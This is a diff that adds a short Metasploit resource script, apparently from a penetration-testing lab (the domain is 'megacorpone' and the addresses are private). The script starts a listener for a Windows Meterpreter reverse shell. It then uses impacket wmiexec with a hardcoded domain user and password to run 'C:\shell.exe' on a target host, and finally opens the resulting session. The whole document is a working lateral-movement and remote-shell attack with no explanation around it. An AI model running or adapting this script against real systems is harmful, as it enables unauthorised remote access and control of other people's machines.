@@ -1,0 +1,18 @@
+#!/bin/bash
+#resource2.rc
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 172.22.117.100
+set LPORT 4444
+exploit -j
+
+use scanner/smb/impacket/wmiexec
+set RHOSTS 172.22.117.20
+set SMBDomain megacorpone
+set SMBPass Password!
+set SMBUser tstark
+set COMMAND C:\shell.exe
+run
+
+sessions -i 1
